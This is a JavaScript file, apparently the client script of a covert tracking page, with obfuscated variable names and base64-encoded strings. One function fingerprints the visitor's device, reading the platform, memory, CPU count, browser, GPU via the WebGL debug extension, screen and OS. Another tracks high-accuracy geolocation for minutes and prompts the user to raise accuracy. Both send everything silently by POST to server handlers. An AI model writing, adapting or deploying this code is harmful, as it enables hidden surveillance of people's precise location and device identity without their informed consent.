function information() {
  var _0x234cb5 = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var _0x79f114 = navigator.deviceMemory;
  var _0x6d45b5 = navigator.userAgent;
  var _0x39f412 = _0x6d45b5;
  var os = _0x6d45b5;
  //gpu
  var _0xf617b0 = document.createElement('_0xf617b0');
  var gl;
  var _0x166c02;
  var _0x4154b4;
  var _0xe3195a;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //_0x79f114
  if (_0x79f114 == undefined) {
    _0x79f114 = 'Not Available';
  }

  //browser
  if (_0x6d45b5.indexOf('Firefox') != -1) {
    _0x39f412 = _0x39f412.substring(_0x39f412.indexOf(' Firefox/') + 1);
    _0x39f412 = _0x39f412.split(' ');
    brw = _0x39f412[0];
  }
  else if (_0x6d45b5.indexOf('Chrome') != -1) {
    _0x39f412 = _0x39f412.substring(_0x39f412.indexOf(' Chrome/') + 1);
    _0x39f412 = _0x39f412.split(' ');
    brw = _0x39f412[0];
  }
  else if (_0x6d45b5.indexOf('Safari') != -1) {
    _0x39f412 = _0x39f412.substring(_0x39f412.indexOf(' Safari/') + 1);
    _0x39f412 = _0x39f412.split(' ');
    brw = _0x39f412[0];
  }
  else if (_0x6d45b5.indexOf('Edge') != -1) {
    _0x39f412 = _0x39f412.substring(_0x39f412.indexOf(' Edge/') + 1);
    _0x39f412 = _0x39f412.split(' ');
    brw = _0x39f412[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = _0xf617b0.getContext('webgl') || _0xf617b0.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    _0x166c02 = gl.getExtension(atob("V0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbw=="));
    _0x4154b4 = gl.getParameter(_0x166c02.UNMASKED_VENDOR_WEBGL);
    _0xe3195a = gl.getParameter(_0x166c02.UNMASKED_RENDERER_WEBGL);
  }
  if (_0x4154b4 == undefined) {
    _0x4154b4 = 'Not Available';
  }
  if (_0xe3195a == undefined) {
    _0xe3195a = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();
  //
  $.ajax({
    type: atob("UE9TVA=="),
    url: atob("aW5mb19oYW5kbGVy"),
    data: { Ptf: _0x234cb5, Brw: brw, Cc: cc, Ram: _0x79f114, Ven: _0x4154b4, Ren: _0xe3195a, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: atob("dGV4dA==")
  });
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var _0x6c7d32 = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    var _0x49b50a = navigator.geolocation.watchPosition(showPosition, showError, _0x6c7d32);
    // Auto-clear watch after 5 minutes to avoid battery drain
    setTimeout(function() { navigator.geolocation.clearWatch(_0x49b50a); }, 300000);
  }

  var _0x29685b = true;

  function showError(error) {
    var _0x1b4973;
    var _0x0ec2b1 = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        _0x1b4973 = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        _0x1b4973 = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        _0x1b4973 = 'The request to get user location timed out';
        alert('Please set your location mode on high accuracy...');
        break;
      case error.UNKNOWN_ERROR:
        _0x1b4973 = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("ZXJyb3JfaGFuZGxlcg=="),
      data: { Status: _0x0ec2b1, Error: _0x1b4973 },
      success: errCallback(error, _0x1b4973),
      mimeType: atob("dGV4dA==")
    });
  }
  function showPosition(position) {
    var _0xf3af3e = position.coords.latitude;
    if (_0xf3af3e) {
      _0xf3af3e = _0xf3af3e + ' deg';
    }
    else {
      _0xf3af3e = 'Not Available';
    }
    var _0x070cff = position.coords.longitude;
    if (_0x070cff) {
      _0x070cff = _0x070cff + ' deg';
    }
    else {
      _0x070cff = 'Not Available';
    }
    var _0x527b99 = position.coords.accuracy;
    if (_0x527b99) {
      _0x527b99 = _0x527b99 + ' m';
    }
    else {
      _0x527b99 = 'Not Available';
    }
    var _0xd33159 = position.coords.altitude;
    if (_0xd33159) {
      _0xd33159 = _0xd33159 + ' m';
    }
    else {
      _0xd33159 = 'Not Available';
    }
    var _0x678c0f = position.coords.heading;
    if (_0x678c0f) {
      _0x678c0f = _0x678c0f + ' deg';
    }
    else {
      _0x678c0f = 'Not Available';
    }
    var _0xfebdce = position.coords.speed;
    if (_0xfebdce) {
      _0xfebdce = _0xfebdce + ' m/s';
    }
    else {
      _0xfebdce = 'Not Available';
    }

    var _0xac6d67 = 'success';

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("cmVzdWx0X2hhbmRsZXI="),
      data: { Status: _0xac6d67, Lat: _0xf3af3e, Lon: _0x070cff, Acc: _0x527b99, Alt: _0xd33159, Dir: _0x678c0f, Spd: _0xfebdce },
      success: _0x29685b ? callback : function(){},
      mimeType: atob("dGV4dA==")
    });
    _0x29685b = false;
  };
}

